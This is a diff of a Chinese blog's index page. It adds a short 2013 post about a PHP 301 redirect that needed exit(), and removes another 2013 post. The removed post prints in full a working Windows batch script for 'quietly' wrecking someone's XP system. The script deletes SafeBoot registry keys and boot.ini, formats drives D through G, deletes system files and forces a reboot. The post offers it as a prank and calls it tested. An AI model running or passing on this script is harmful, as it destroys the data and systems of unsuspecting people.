@@ -61,6 +61,69 @@
 
   
     
+    <h3 class="article-title"><a href="/2013/06/11/关于 php header 的问题/"><span>关于 php header 的问题</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2013/06/11/关于 php header 的问题/" rel="bookmark">
+        <time class="entry-date published" datetime="2013-06-11T06:48:11.000Z">
+          2013-06-11
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p>博主最近有个站域名快要过期了，但又没钱续费，只能用下 BAE 提供的免费域名。学过 seo 的童鞋都应该知道，换域名得做域名跳转，同时发出 301 状态码通知搜索引擎你的网站更换域名了。因为是 WordPress，所以加跳转代码很简单，直接在 /index.php 第一个 <code>&lt;?php</code> 后面加上<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_HOST'</span>]!==<span class="string">'bwlzyzdsb.duapp.com'</span>) &#123; <span class="comment">//bwlzyzdsb.duapp.com 是博主网站域名，实际应用时请修改为自己的域名</span></span><br><span class="line">header(<span class="string">'Location: http://bwlzyzdsb.duapp.com/'</span>,<span class="keyword">true</span>,<span class="number">301</span>); <span class="comment">//同上</span></span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可当时偏偏就忘记加上 <code>exit();</code> 了，用站长工具查看状态码一直是 HTTP/1.1 302 Found ，无奈换了个方法，先 header 301 状态码，再 header Location，问题依旧。检查了下代码，加上 <code>exit();</code> 问题解决。</p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/建站相关/">建站相关</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+    <div class="article-meta pull-right">
+      <span>
+        <i class="icon-comments"></i>
+        <span>
+          <a href="/2013/06/11/关于 php header 的问题/#comment">评论</a>
+        </span>
+      </span>
+    </div>
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
     <h3 class="article-title"><a href="/2013/06/11/神舟十号发射成功！/"><span>神舟十号发射成功！</span></a></h3>
     
   
@@ -694,73 +757,6 @@
 
 
 
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2013/05/25/悄悄地干掉他的xp系统？/"><span>悄悄地干掉他的xp系统？</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2013/05/25/悄悄地干掉他的xp系统？/" rel="bookmark">
-        <time class="entry-date published" datetime="2013-05-25T15:45:54.000Z">
-          2013-05-25
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-        <p>干掉xp？<br>简单，pe或者安装盘格盘不就完了么？<br>问题是怎么   悄悄的   干掉他的xp？<br>淫荡的人自有淫荡的方法，现在贴给你这个方法（太毒了，注意后边的话）</p>
-<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">exit</span>|<span class="variable">%ComSpec%</span> /k prompt e <span class="number">100</span> B4 <span class="number">00</span> B0 <span class="number">12</span> <span class="built_in">CD</span> <span class="number">10</span> B0 <span class="number">03</span> <span class="built_in">CD</span> <span class="number">10</span> <span class="built_in">CD</span> <span class="number">20</span> $_g$_q$_|debug&gt;<span class="built_in">nul</span></span><br><span class="line"><span class="built_in">chcp</span> <span class="number">437</span>&gt;<span class="built_in">nul</span></span><br><span class="line"><span class="built_in">graftabl</span> <span class="number">936</span>&gt;<span class="built_in">nul</span></span><br><span class="line">REG DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot" /v Network /f</span><br><span class="line">REG DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot" /v Minimal /f</span><br><span class="line"><span class="built_in">ATTRIB</span> <span class="variable">%SYSTEMDRIVE%</span>\boot.ini -s -a -r -h</span><br><span class="line"><span class="built_in">DEL</span> <span class="variable">%SYSTEMDRIVE%</span>\boot.ini /f</span><br><span class="line"><span class="built_in">format</span> d:/q /y</span><br><span class="line"><span class="built_in">format</span> e:/q /y</span><br><span class="line"><span class="built_in">format</span> f:/q /y</span><br><span class="line"><span class="built_in">format</span> g:/q /y</span><br><span class="line"><span class="built_in">cd</span> c:\</span><br><span class="line"><span class="built_in">cd</span> windows</span><br><span class="line"><span class="built_in">del</span> *.* /q</span><br><span class="line"><span class="built_in">cd</span> system32</span><br><span class="line"><span class="built_in">del</span> *.* /q</span><br><span class="line"><span class="built_in">del</span> %<span class="number">0</span></span><br><span class="line">shutdown -r -t <span class="number">3</span></span><br></pre></td></tr></table></figure>
-<p>先改注册表.<br>再改分区表.<br>再格式化磁盘d、e、f、g分区<br>再删除C盘的资料<br>然后再关机……</p>
-<p>添加到boot.ini,重启后执行删除</p>
-<p>经过试验，这是真的</p>
-<p>转载自：<a href="http://www.5169.info/software/quietly-get-rid-of-his-xp-system.html" target="_blank" rel="noopener">http://www.5169.info/software/quietly-get-rid-of-his-xp-system.html</a></p>
-
-      
-    </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-      
-
-    <span class="post-categories">
-      <i class="icon-categories"></i>
-        <a href="/categories/计算机技术/">计算机技术</a>
-    </span>
-    
-
-    
-
-    </div>
-
-    
-    <div class="article-meta pull-right">
-      <span>
-        <i class="icon-comments"></i>
-        <span>
-          <a href="/2013/05/25/悄悄地干掉他的xp系统？/#comment">评论</a>
-        </span>
-      </span>
-    </div>
-    
-  </div>
-</article>
-
-
-
 
 <nav class="pagination">
   
@@ -778,7 +774,7 @@
     Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
     </br>
     
-    &copy; 2020 403 Forbidden
+    &copy; 2021 403 Forbidden
     
   </p>
 </footer>
